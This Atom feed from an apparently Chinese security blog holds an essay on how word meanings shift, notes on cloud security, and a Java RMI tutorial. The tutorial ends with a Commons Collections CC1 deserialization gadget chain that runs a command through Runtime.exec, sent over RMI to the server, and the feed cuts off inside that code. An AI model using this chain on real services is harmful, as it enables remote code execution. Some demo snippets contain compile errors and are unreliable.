<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="https://usingns.github.io/atom.xml" rel="self"/>
  
  <link href="https://usingns.github.io/"/>
  <updated>2025-07-28T03:43:33.617Z</updated>
  <id>https://usingns.github.io/</id>
  
  <author>
    <name>us1n9ns</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>一次关于词意演变的谈话</title>
    <link href="https://usingns.github.io/2025/07/28/%E4%B8%80%E6%AC%A1%E5%85%B3%E4%BA%8E%E8%AF%8D%E6%84%8F%E6%BC%94%E5%8F%98%E7%9A%84%E8%B0%88%E8%AF%9D/"/>
    <id>https://usingns.github.io/2025/07/28/%E4%B8%80%E6%AC%A1%E5%85%B3%E4%BA%8E%E8%AF%8D%E6%84%8F%E6%BC%94%E5%8F%98%E7%9A%84%E8%B0%88%E8%AF%9D/</id>
    <published>2025-07-28T03:40:52.000Z</published>
    <updated>2025-07-28T03:43:33.617Z</updated>
    
    <content type="html"><![CDATA[<p>其实我是想起“《词语的污名化与语言权力的再分配：当代舆论环境下语言意义的演变与争夺》”为标题<br>但感觉会把很多人吓到，就算了<br>问答是和朋友聊天，想到哪里说哪里，自由讨论的氛围</p><h1 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a>讨论</h1><p>问：<br>还想要讨论一个问题<br>语言膨胀该怎么避免<br>或者说该怎么应对</p><p>答：<br>什么叫语言膨胀</p><p>问：<br>我感觉我表达的权利在被剥夺，比如”孝顺，孝子”这个词，本意就是尊重父母，善待亲人，现在在一些语境下已经变成了一种站队立场或者说一种绑架<br>这还是好的<br>还有一些词汇不是特殊语境下<br>他的意思就已经发生了污名化</p><p>答：<br>我看未必<br>语言随时代发展多少会有些其他含义</p><p>问：<br>问题在于本来是中性<br>可以有更加广泛的表达<br>现在变得极端</p><p>答：<br>可以认为是语言的与时俱进，也就是说有进步性</p><p>问：<br>比如”媛女”</p><p>答：<br>不就是鸡</p><p>问：<br>你说得对，但是<br>应瑒《正情赋》”夫何媛女之殊丽兮，姿温惠而明哲”<br>就只是淑女，美人的意思<br>东汉的说文解字，”媛，美女也，人所援也”</p><p>答：<br>那没办法</p><p>问：<br>原本中性的词义不断向贬义&#x2F;褒义两极拉伸<br>语言张力的失去怎么能说是进步</p><p>答：<br>这种情况下，另一种意思只能在很少的情况下用到<br>那就不是进步，语言的演变</p><p>问：<br>问题在于<br>现在不是很少用到，是人们不知道<br>当被所有人认为他的后来的意思就是他本意的时候，那么他的本意就发生了变化</p><p>答：<br>对呀</p><p>问：<br>这就导致一种舆论环境，社会影响在剥夺我所使用语言的权利</p><p>答：<br>所以语言演变了</p><p>问：<br>语言变成了一种工具，一种舆论斗争的武器<br>语言演变也有好有坏，所以我说的是主观看法<br>这显然不是一种好的现象</p><p>答：<br>那你能咋办</p><p>问：<br>一些词汇导致我无法再随便说出口，因为这种词汇常常不是我说了什么，而是别人认为我说了什么</p><p>答：<br>语言本来就是这样的</p><p>问：<br>词汇已经被附加了一些别的意义，道德判断，政治立场，群体对立这些</p><p>答：<br>细心的人总是要考虑对方的认知程度</p><p>问：<br>你说的没错，但问题在于跟对方的认知没有关系<br>环境造成了一个人怎样的认知，怪的不应该是人，应该是环境。<br>这种语言的扭曲化，在压迫我使用语言的权利<br>甚至常常让我被迫的自我审查<br>看看是不是自己说哪里说的不合适<br>使用某些词汇的时候要小心翼翼，生怕被误解<br>而且有一些语言不单单是语言，就像刚才说的”媛女”，他也是古典文化的认同，你现在看到”妖童媛女，荡舟心许”什么感觉</p><p>答：<br>666</p><p>问：<br>可实际上这是采莲赋的一句话<br>并没有别的意思<br>是一种审美体系的连接，一些温婉优雅的词汇，留白与联想都被暴力的摧毁<br>偏偏这个过程还是个人无法抵抗，就像一叶扁舟迎击海浪<br>没办法反抗<br>舆论环境直接变成了这个样子<br>你说出来就会被误读，被讽刺，被扭曲<br>然后你怎么办呢，显然，就会像你刚才说的，细心的人总会考虑对方的想法，然后你就会不用这个词，或者尽量用不会让人误解的词<br>而且不单单是污名化<br>还有扭曲变质<br>比如”咋了”，”那咋了”这个<br>不可否认他确实是一种反问的语气，反问的态度<br>但实际上他想要表达的就仅仅是”你说的这种情况成立的话，然后面对这种情况怎么处理”，”发生什么事了”这种意思<br>但现在变成了一种非暴力不合作，一种死皮赖脸，死猪不怕开水烫的感觉</p><p>我还记得在我之前上学的时候<br>那个时候这个词就已经改变了<br>当时是我们在上自习，然后班主任在讲台上叫我名字，我直接站起来抬头说，咋了<br>然后他一下生气了，把黑板擦扔到了我的身上<br>说你这是什么态度<br>这件事情我到现在还记得<br>因为我的本意真的就是简单的说”叫我干什么”，”叫我有什么事情的”意思<br>但是使用词汇的情况远远没有现在恶劣<br>昂，就大概想讨论这个话题</p><p>答：<br>跟班主任多少有点关系(笑)</p><p>问：<br>(笑)反正我就觉得很抽象</p><p>答：<br>既然改变不了，那就不如改变自己<br>或者干脆不管了</p><p>问：<br>我之前都是干脆不管了的状态<br>直到有次和朋友聊天<br>我忘了我说了什么词了，反正他就直接误解了，然后很生气。<br>后来我搜了一下才知道，现在已经不是那个意思<br>其实他很生气，我也很莫名其妙</p><p>答：<br>有误会很正常<br>解释一下道个歉<br>接受不了就拜拜</p><p>问：<br>不，我们现在关系很好，不是道不道歉的问题，我是说这种现象总感觉不是好事儿<br>包是退步的<br>就少了很多中性词，往两端去了</p><p>答：<br>那你能咋办<br>只能说有误会抓紧解开就行</p><p>问：<br>比如”哈哈”，这就是”笑”的意思了，但是现在我用哈哈这个总感觉怪怪的<br>那网友呢</p><p>答：<br>解释一下道个歉</p><p>问：<br>或者说陌生人呢<br>网友可不管你这那的<br>你说了就要被骂<br>再说了人都有三分火气<br>他不识抬举凭什么给他道歉<br>你看这样莫名其妙的矛盾冲突就来了</p><p>答：<br>接受不了就拜拜</p><p>问：<br>那被骂的心里总是不好受的</p><p>答：<br>骂回去</p><p>问：<br>骂回去的精力还是自己支付的<br>生一肚子气发现对象是网友，现实生活中八竿子打不着，和自己不相关的人</p><p>答：<br>那直接不理不就行了</p><p>问：<br>不理你也是被骂了呀<br>就好比你在路上走着走着，一个你看得见摸不着的人骂了你一句<br>然后这个人扭头就走了，你再也找不到他<br>这就是”直接不理”<br>其实我感觉还是社会发展太快了</p><p>答：<br>666<br>守旧派来了</p><p>问：<br>人文素质没有跟上物质生活的发展<br>并非守旧<br>现在物质生活我当然承认给我们带来特别多的方便<br>让我回去我也不愿意。<br>比如说网民，总有一些没受过教育的人乱叫<br>是物质生活的发展让他可以上网，但不代表他的个人素质就到了可以上网的地步<br>现实大街上一个人莫名其妙骂了你两句，你把他告了，还会得到民事调解，在法律上来讲叫寻衅滋事<br>但在网络中你可真就是看得见，摸不着<br>讲明白了理也得不到什么，没有自己把道理讲通的畅快感，只有和蠢人对话的窝囊感<br>所以我才说是人文素养没有跟上物质发展</p><p>答：<br>所以才要发展教育呀<br>但是你想这么多也没啥用呀<br>不如干点实事</p><p>问：<br>那个显然不是一年两年五六年的事，不是吗<br>人生又有几个意气风发的五六年<br>我就在想干什么实事</p><p>答：<br>从政吧<br>坚守本心，认真务实</p><p>问：<br>难啊<br>在自己分内做事，做出效果是应该追求的目标</p><p>答：<br>得道者多助，失道者寡助(摊手)</p><p>问：<br>是的<br>不过，这里的道指的是道义，或者说是”正确的”，”义气的”也就是大家能看到的正确的事情<br>清醒的人还是少，到底多助不多助谁也说不准<br>民国时期，愤青自以为清醒，军阀骗自己糊涂，大众多是愚昧从众的，煌煌大陆，放眼之下，鲁迅又有几个<br>失败的”得道者”已经进了坟墓，死人又怎么开口。胜利者一定是”得道”的，因为不”得道”怎么”胜利”，“胜利”了怎么会“不得道”(讽刺)</p><p>答：<br>太深奥了<br>你还是自己慢慢想吧</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>到这里我们的谈话就基本结束了，以下是我的总结与思考</p><ul><li><p>词汇演变的大势不可逆转，是社会舆论，多方面多群体多事件合力的出现的多影响，现代媒介出力颇多</p></li><li><p>留白的词汇变得两端化，这就是语言的退步</p></li><li><p>这种污名机制本质上是语言对个体的一种集体暴力，在“言语自由”旗帜下执行的是“表达封锁”。</p></li><li><p>表达不再是思想的释放，而变成了立场的表忠，不仅削弱了语言本该承担的公共交流功能，也让语言沦为“舆论风控”的附庸。</p></li><li><p>在自己的份内做事，做出效果是应该追求的目标</p></li></ul><p>应该认识到，一个词的含义不止于字典，它存在于使用者与听者之间的语境博弈中。对热点标签词保持审慎，避免在未经定义澄清的语境下使用或参与；<br>在表达前加入对词义的框定说明，使用如“我所理解的X是…”、“这里的X不等于网络语义中的X”，通过“讨论语言本身”来阻挡词语污名化的路径；<br>在信任较高的空间中维持语言的丰富性与表达的安全性，保护语言表达中的模糊性与探索性</p><p>语言既是思想的容器，也是社会的武器。当它被权力操纵、舆论操弄、标签扭曲之时，我们的表达能力、社会参与权甚至个体认同感也将被连带侵蚀。<br>在这样的环境下，维护语言的表达自由，不只是为了说话的权利，更是为了思考与存在的完整。<br>你是否也有过语言空白无力，不知道该说什么，只会使用一些网络“梗”，在发言之前犹犹豫豫，在与对方辩论之前怀疑是否必要，在被讽刺挖苦之后自我审查此类现象。真理越辩越明，道理越讲越清</p><blockquote><p>“语言是思想的栖居之地。”——海德格尔</p></blockquote><p>若我们不能自由使用语言，我们终将无法自由思考。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;其实我是想起“《词语的污名化与语言权力的再分配：当代舆论环境下语言意义的演变与争夺》”为标题&lt;br&gt;但感觉会把很多人吓到，就算了&lt;br&gt;问答是和朋友聊天，想到哪里说哪里，自由讨论的氛围&lt;/p&gt;
&lt;h1 id=&quot;讨论&quot;&gt;&lt;a href=&quot;#讨论&quot; class=&quot;headerl</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Lesson初次了解云安全</title>
    <link href="https://usingns.github.io/2025/07/27/FirstLesson%E5%88%9D%E6%AC%A1%E4%BA%86%E8%A7%A3%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    <id>https://usingns.github.io/2025/07/27/FirstLesson%E5%88%9D%E6%AC%A1%E4%BA%86%E8%A7%A3%E4%BA%91%E5%AE%89%E5%85%A8/</id>
    <published>2025-07-27T08:32:21.000Z</published>
    <updated>2025-07-27T08:37:25.290Z</updated>
    
    <content type="html"><![CDATA[<h1 id="隔离桌面服务"><a href="#隔离桌面服务" class="headerlink" title="隔离桌面服务"></a>隔离桌面服务</h1><p>宗旨在于尽可能的减少攻击面</p><p>首先，从学术角度解析可能存在的威胁</p><ul><li><p>保密性</p></li><li><p>完整性</p></li><li><p>可用性</p><p>网站上可见的应用程序数据不是秘密的，事实上，系统几乎没有文件会包含机密，因此，机密性失败不会产生任何影响。</p><p>可用性和完整性</p><p>可用性，通常，托管良好的网站会对访问者进行快速响应，dos，ddos<br>完整性，显然，网站必须防范完整性攻击，这一直是网站面临的挑战</p></li></ul><h1 id="CVSS"><a href="#CVSS" class="headerlink" title="CVSS"></a>CVSS</h1><p>漏洞影响评分<br>高，低，无影响</p><p>针对web服务的攻击或者软件攻击，他们可以来自互联网的任何地方，包括互联网流量直接触及的所有软件</p><p>这些软件的每一个漏洞都可能提供攻击媒介<br>网络设备驱动媒介是第一个可见的软件，驱动程序嵌入在操作系统中<br>协议栈处理基本的网络服务<br>web服务器实现应用程序<br>每个软件组件都尽可能地专注于自己的工作，忽视(不处理)用于其他组件的数据</p><p>如今，大多数漏洞出现在服务器软件上，通过尽可能地减少服务，将未使用的端口连接到其他服务器软件，尽量避免重复常用的端口号</p><p>文件系统，检索文件</p><p>现代计算机配备态势感知，日志记录，这不能防止，但是可以保留，以防出现</p><h1 id="云计算服务模型"><a href="#云计算服务模型" class="headerlink" title="云计算服务模型"></a>云计算服务模型</h1><p>云服务器包含典型的服务器组件<br>硬件层提供存储，计算能力和网络连接<br>操作系统<br>中间件层，其中包含编程语言和服务库等工具<br>云应用程序</p><p>计算机是通过管理员进行维护，谁在云端修复了什么？<br>根据服务模式在云供应商和云消费者之间进行分工。</p><p>供应商从硬件层向上处理事情，全方位服务提供商运用资源满足服务需求，可以为操作系统分配更多进程，或者为消费者的服务分配更多的虚拟硬件<br>消费者从应用程序向下处理事物，包括配置客户群以及自定义用用程序开发</p><p>具体来说还要看服务模式<br>分为基础设施服务IAAS，平台服务PAAS，软件服务SAAS</p><p>IAAS显然是操作系统。基础架构可能由物理机或者虚拟机组成<br>PAAS提供了更多的软件支持，负责维护硬件，操作系统和中间件对的某些层。不过某些工艺工商也可能会专注于特定的语言或者框架，Java,Drupal,JavaScript等<br>PAAS有几个例子，比如云存储，用户非常重视移动性和可靠性。再比如容器概念<br>SAAS顾名思义，提供商提供软件的大部分责任</p><h1 id="云部署模型"><a href="#云部署模型" class="headerlink" title="云部署模型"></a>云部署模型</h1><p>云部署模型：公有云 &#x2F; 私有云 &#x2F; 混合云 &#x2F; 社区云</p><h2 id="云部署的安全策略"><a href="#云部署的安全策略" class="headerlink" title="云部署的安全策略"></a>云部署的安全策略</h2><h3 id="身份与访问控制IAM"><a href="#身份与访问控制IAM" class="headerlink" title="身份与访问控制IAM"></a>身份与访问控制IAM</h3><ul><li>最小权限原则</li><li>多因子认证</li><li>角色管理与策略</li><li>服务间授权：使用临时凭证或者访问角色让服务之间通信</li></ul><h3 id="数据安全"><a href="#数据安全" class="headerlink" title="数据安全"></a>数据安全</h3><ul><li>传输加密：使用 TLS（HTTPS、SSL）确保数据在传输中安全</li><li>静态加密：客户管理密钥和云厂商托管密钥，支持BYOK(Bring Your Own Key)</li><li>敏感数据脱敏&#x2F;分级存储</li></ul><h3 id="网络安全"><a href="#网络安全" class="headerlink" title="网络安全"></a>网络安全</h3><ul><li>虚拟私有云VPC划分子网，控制流量入口出口</li><li>安全组+网络ACL控制通信</li><li>配置Bastion Host&#x2F;VPN来管理远程访问</li><li>使用WAF防止常见Web攻击</li></ul><h3 id="日志与监控"><a href="#日志与监控" class="headerlink" title="日志与监控"></a>日志与监控</h3><ul><li>集中式日志收集</li><li>实时监控与告警</li><li>设置SIEM系统(Splunk,ELK)用于入侵检测与审计</li></ul><h3 id="高可用与灾备"><a href="#高可用与灾备" class="headerlink" title="高可用与灾备"></a>高可用与灾备</h3><ul><li>多区域部署</li><li>数据快照与自动备份</li><li>自动故障转移机制Failover</li><li>灾备演练与业务连续性计划（BCP）</li></ul><h2 id="云架构设计-适用于云原生应用或迁移方案"><a href="#云架构设计-适用于云原生应用或迁移方案" class="headerlink" title="云架构设计(适用于云原生应用或迁移方案)"></a>云架构设计(适用于云原生应用或迁移方案)</h2><h3 id="可用性设计"><a href="#可用性设计" class="headerlink" title="可用性设计"></a>可用性设计</h3><ul><li>使用负载均衡（ALB&#x2F;ELB）实现服务分流<br>将进入的请求流量分发到多台后端服务器，提高系统可用性，伸缩性，容错能力</li><li>多可用区部署（高可用架构）</li><li>自动扩缩容（Auto Scaling）- 使用负载均衡（ALB&#x2F;ELB）实现服务分流</li><li>多可用区部署（高可用架构）</li><li>自动扩缩容（Auto Scaling）</li></ul><h3 id="解耦与微服务化"><a href="#解耦与微服务化" class="headerlink" title="解耦与微服务化"></a>解耦与微服务化</h3><ul><li>使用消息队列（如 AWS SQS、Kafka）解耦组件（？）</li><li>构建微服务架构（如容器 + Service Mesh）</li><li>使用 Serverless（如 AWS Lambda）构建事件驱动架构（动态分配）</li></ul><h3 id="弹性设计"><a href="#弹性设计" class="headerlink" title="弹性设计"></a>弹性设计</h3><ul><li>配置 Auto Scaling Group（ASG）（自动扩容，自动缩容）</li><li>无状态服务设计（实例之间不进行共享或者本地存储，便于横向扩展，会话管理使用集中式缓存Redis等，用户数据上传保存到对象存储。应用逻辑保持幂等性也就是多次请求处理结果相同）</li><li>使用 CDN 提供静态内容（如 CloudFront）</li></ul><h3 id="容器与编排"><a href="#容器与编排" class="headerlink" title="容器与编排"></a>容器与编排</h3><ul><li>使用 Docker 容器构建应用</li><li>使用 Kubernetes（K8s）管理容器编排与调度</li><li>实现蓝绿部署 &#x2F; 灰度发布 &#x2F; 回滚机制（蓝绿是同时运行的两个环境，一个是线上环境，另一个为备份，灰度发布就是新版本只给部分用户）</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;隔离桌面服务&quot;&gt;&lt;a href=&quot;#隔离桌面服务&quot; class=&quot;headerlink&quot; title=&quot;隔离桌面服务&quot;&gt;&lt;/a&gt;隔离桌面服务&lt;/h1&gt;&lt;p&gt;宗旨在于尽可能的减少攻击面&lt;/p&gt;
&lt;p&gt;首先，从学术角度解析可能存在的威胁&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p</summary>
      
    
    
    
    <category term="Cloud_Security" scheme="https://usingns.github.io/categories/Cloud-Security/"/>
    
    
    <category term="Cloud_First" scheme="https://usingns.github.io/tags/Cloud-First/"/>
    
  </entry>
  
  <entry>
    <title>RMI</title>
    <link href="https://usingns.github.io/2025/07/20/RMI/"/>
    <id>https://usingns.github.io/2025/07/20/RMI/</id>
    <published>2025-07-20T06:19:40.000Z</published>
    <updated>2025-07-20T06:20:23.764Z</updated>
    
    <content type="html"><![CDATA[<p>远程方法调用<br>结构简单分为：</p><ul><li>客户端</li><li>客户端注册中心</li><li>服务端</li><li>服务端注册中心</li></ul><h2 id="调用要求"><a href="#调用要求" class="headerlink" title="调用要求"></a>调用要求</h2><p>首先，客户端和服务端需要用有相同的接口，不同的是服务端还需要有接口的具体实现方法，这也比较符合常识<br>其次，接口必须要被实现后才能进行调用，客户端通过注册中心动态代理生成，负责把方法调用通过网络传递到服务端，而服务端注册中心解析客户端注册中心请求，然后服务端调用真正接口实现函数</p><h2 id="测试demo"><a href="#测试demo" class="headerlink" title="测试demo"></a>测试demo</h2><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>#创建接口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line"></span><br><span class="line">import java.rmi.Remote;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">import java.rmi.Remote;</span><br><span class="line"></span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">import junit.framework.Test;</span><br><span class="line"></span><br><span class="line">import junit.framework.TestCase;</span><br><span class="line"></span><br><span class="line">import junit.framework.TestSuite;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">public interface Calc extends Remote &#123;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    public int add(int a,int b);</span><br><span class="line"></span><br><span class="line">    public void print(Object o);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把这部分都放进客户端项目和服务端项目，也就意味着拥有了相同的接口<br>#详细在服务端写是实现类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public class Calcmpl implements Calc&#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line"></span><br><span class="line">    public int add(int a ,int b)&#123;</span><br><span class="line"></span><br><span class="line">        int resule = a+b;</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;%d+%d = %d\n&quot;,a,b,resule );</span><br><span class="line"></span><br><span class="line">        return result;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line"></span><br><span class="line">    public void print(Object o)&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(0);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>#主程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">package rmi;</span><br><span class="line">import java.rmi.*;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry; </span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line">public class RMIServer &#123; public static void main(String[] args) throws RemoteException &#123; Registry registry = LocateRegistry.createRegistry(6543); </span><br><span class="line">Calc calc = new Calcmpl(); </span><br><span class="line">//把实现类绑定到注册中心</span><br><span class="line">registry.rebind(&quot;calc&quot;, UnicastRemoteObject.exportObject(calc, 0)); &#125; &#125;</span><br></pre></td></tr></table></figure><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import java.rmi.*;</span><br><span class="line"></span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">public class RMIClient &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws RemoteException ,NotBoundException&#123;</span><br><span class="line"></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,6543);</span><br><span class="line"></span><br><span class="line">        Calc calc = (Calc)registry.lookup(&quot;calc&quot;);</span><br><span class="line"></span><br><span class="line">        int result =calc.add(1,2);</span><br><span class="line"></span><br><span class="line">        System.out.println(result);</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到结果</p><img src="/2025/07/20/RMI/1.png" class=""><img src="/2025/07/20/RMI/2.png" class=""><p>发现是在RMIServer上面运行的函数<br>在RMIClient上面接收的结果</p><h2 id="如何调用"><a href="#如何调用" class="headerlink" title="如何调用"></a>如何调用</h2><p>使用RMIClient这边去打RMIServer注册中心这边<br>具体怎么操作呢<br>可以试试使用前几篇文章中提到的cc1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    public void test2() throws Exception &#123;  </span><br><span class="line">/*        ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.getRuntime());  </span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer(                &quot;exec&quot;,                new Class[]&#123;String.class&#125;,                new Object[]&#123;&quot;calc&quot;&#125;        );*/  </span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;  </span><br><span class="line">                new ConstantTransformer(Runtime.class),  </span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),  </span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),  </span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)  </span><br><span class="line">        &#125;);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();  </span><br><span class="line">        map.put(&quot;value&quot;, &quot;b&quot;);  </span><br><span class="line">        Map&lt;Object,Object&gt; decorated = TransformedMap.decorate(map, null, chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);  </span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);  </span><br><span class="line">        constructor.setAccessible(true);  </span><br><span class="line">        Object o = constructor.newInstance(Target.class, decorated);  </span><br><span class="line">        CCTest.serialize(o);  </span><br><span class="line">        CCTest.unserialize(&quot;ser.bin&quot;);</span><br></pre></td></tr></table></figure><p>修改下传入为对象cc1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">import service.Calc;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">import java.lang.annotation.Target;  </span><br><span class="line">import java.lang.reflect.Constructor;  </span><br><span class="line">import java.lang.reflect.InvocationTargetException;  </span><br><span class="line">import java.rmi.NotBoundException;  </span><br><span class="line">import java.rmi.RemoteException;  </span><br><span class="line">import java.rmi.registry.LocateRegistry;  </span><br><span class="line">import java.rmi.registry.Registry;  </span><br><span class="line">import java.util.HashMap;  </span><br><span class="line">import java.util.Map;  </span><br><span class="line">  </span><br><span class="line">import  org.apache.commons.collections.Transformer;  </span><br><span class="line">import  org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line">import  org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line">import  org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">public class RMIClient &#123;  </span><br><span class="line">    public static void main(String[] args) throws RemoteException, NotBoundException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;  </span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,9000);  </span><br><span class="line">        Calc calc = (Calc)registry.lookup(&quot;calc&quot;);  </span><br><span class="line">        calc.print(cc1());  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static Object cc1() throws RemoteException, NotBoundException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;  </span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;  </span><br><span class="line">                new ConstantTransformer(Runtime.class),  </span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),  </span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),  </span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();  </span><br><span class="line">        map.put(&quot;value&quot;, &quot;b&quot;);  </span><br><span class="line">        